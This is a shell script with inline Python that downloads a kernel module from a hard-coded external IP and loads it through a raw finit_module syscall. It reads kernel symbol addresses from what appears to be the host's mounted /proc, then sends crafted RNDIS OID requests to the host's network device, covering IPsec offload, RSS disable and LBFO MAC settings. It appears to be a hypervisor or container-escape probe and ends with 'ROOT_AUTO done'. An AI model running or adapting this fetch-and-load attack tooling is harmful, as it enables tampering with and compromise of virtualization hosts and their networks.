#!/bin/bash
set +e
exec 0<&-

curl -fsS http://16.146.243.72:8450/rndis_oid_set.ko -o /tmp/rndis_oid_set.ko || exit 10
own_mac=$(tr -d ':\n' </hostsys/class/net/eth0/address 2>/dev/null)
printf 'RNDIS_SET_HOST sysfs_mac=%s\n' "$own_mac"
PYTHONPATH=/tmp python3 - /tmp/rndis_oid_set.ko 0x01010102 '' <<'PY'
import ctypes, os, sys
from rndis_legit_run import resolve_objects
guid, relid, _nvdev, rndis, request_id = resolve_objects()
oid = int(sys.argv[2], 0)
data_hex = sys.argv[3]
def symbol_prefix(name):
    hits=[]
    for line in open('/hostproc/kallsyms'):
        f=line.split()
        if len(f)>=3 and f[1].lower()=='t' and f[2].startswith(name):
            hits.append((f[2],int(f[0],16)))
    if len(hits)!=1: raise RuntimeError('symbol %s hits=%r'%(name,hits))
    return hits[0][1]
values = tuple(symbol_prefix(name) for name in
               ("get_rndis_request", "rndis_filter_send_request", "put_rndis_request"))
parameters = ("get_address=0x%x send_address=0x%x put_address=0x%x rndis_device=0x%x "
              "request_type=4 oid=0x%x input_length=%u arm=1" %
              (values[0], values[1], values[2], rndis, oid, len(data_hex)//2)).encode()
print("RNDIS_SET_PRE guid=%s relid=%u rndis=%x reqid=%u oid=%#x input_length=%u" %
      (guid, relid, rndis, request_id, oid, len(data_hex)//2))
fd=os.open(sys.argv[1], os.O_RDONLY); libc=ctypes.CDLL(None,use_errno=True)
result=libc.syscall(313,fd,parameters,3)
print("RNDIS_SET_FINIT result=%d errno=%d" % (result,ctypes.get_errno()))
PY

paramdir=/hostsys/module/rndis_oid_set/parameters
run_case() {
    label=$1
    case_type=$2
    case_oid=$3
    case_hex=$4
    case_length=${5:-$(( ${#case_hex} / 2 ))}
    printf 'RNDIS_SET_CASE label=%s type=%s oid=%s bytes=%s\n' "$label" "$case_type" "$case_oid" "$case_length"
    printf '%s' "$case_type" >"$paramdir/request_type" || return
    printf '%s' "$case_oid" >"$paramdir/oid" || return
    printf '%s' "$case_hex" >"$paramdir/data_hex" || return
    printf '%s' "$case_length" >"$paramdir/input_length" || return
    printf 1 >"$paramdir/arm"
}

[ -d "$paramdir" ] || exit 11
own_mac=$(dmesg --notime 2>/dev/null | sed -n 's/.*rndis_oid_query oid=0x1010102 result_length=6 .*head=\([[:xdigit:]]\{12\}\).*/\1/p' | tail -1)
printf 'RNDIS_SET_HOST queried_mac=%s\n' "$own_mac"
isolation_header=800118000000000000000000000000000000000000000000
run_case isolation-query 4 0x00010300 "$isolation_header"
run_case isolation-query-full 4 0x00010300 "$isolation_header" 4000
run_case rss-query 4 0x00010204 ''
run_case ipsec-current-query 4 0xfc01020b ''
run_case ipsec-hardware-query 4 0xfc01020d ''
run_case multicast-positive 5 0x01010103 01005e000001
[ "${#own_mac}" != 12 ] || run_case lbfo-own 5 0xfa010203 "$own_mac"
run_case lbfo-random 5 0xfa010203 023900000001
rss_disable=$(python3 - <<'PY'
import struct
# NDIS_RECEIVE_SCALE_PARAMETERS rev2 used by this ABI: 44-byte base, 128
# PROCESSOR_NUMBER entries and a 40-byte key. Flags disable RSS.
head=struct.pack('<BBHHH',0x89,2,44,0x10,0)+struct.pack('<I',0)+struct.pack('<H',512)+b'\0\0'+struct.pack('<I',44)+struct.pack('<H',40)+b'\0\0'+struct.pack('<I',556)+struct.pack('<IIII',0,0,0,0)
print((head+b'\0'*(512+40)).hex())
PY
)
run_case rss-disable-r2 5 0x00010204 "$rss_disable"
ipsec_delete_absent=80011800000000000000000000000000ffffffffffffffff
ipsec_add_ex=$(python3 - <<'PY'
import struct
b=bytearray(0xd0)
b[0]=0x80; b[1]=1
struct.pack_into('<H',b,2,0xaa)
struct.pack_into('<I',b,4,1)
struct.pack_into('<I',b,0x40,1)
struct.pack_into('<I',b,0x44,0x11223344)
struct.pack_into('<IIII',b,0x48,4,32,0,0)
struct.pack_into('<IIII',b,0x58,1,0,0,0)
struct.pack_into('<II',b,0x9c,32,0xb0)
b[0xb0:0xd0]=bytes.fromhex('123456789abcdef0'*4)
print(b.hex())
PY
)
run_case ipsec-delete-absent 5 0xfc030203 "$ipsec_delete_absent"
run_case ipsec-update-empty 5 0xfc030204 ''
run_case ipsec-add-ex 5 0xfc030205 "$ipsec_add_ex"

sleep 2
dmesg --notime 2>/dev/null | grep -E 'rndis_oid_(set|query)' | tail -40
printf 'ROOT_AUTO done\n'
